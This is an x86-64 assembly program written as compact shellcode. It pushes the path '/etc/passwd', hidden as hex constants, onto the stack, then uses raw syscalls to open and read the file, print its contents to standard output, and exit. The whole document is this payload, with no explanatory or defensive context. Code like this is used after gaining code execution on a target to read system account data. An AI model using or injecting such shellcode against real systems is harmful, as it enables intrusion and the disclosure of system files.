section .text


global _start
_start:


        ; put file name on stack


        xor rdx, rdx
        push rdx

        mov rcx, 0x6477737361702f63
        push rcx

        mov rcx, 0x74652f2f2f2f2f2f
        push rcx

        ; open a file


        mov rdi, rsp
        mov al, 2
        syscall

        ; read a file


        mov rdi, rax
        mov rsi, rsp
        mov dx, 0x999


        xor rax, rax
        syscall


        ; print a file

        xor rdi, rdi
        inc edi
        mov rdx, rax

        xor rax, rax
        inc rax
        syscall

        mov al, 60
        syscall
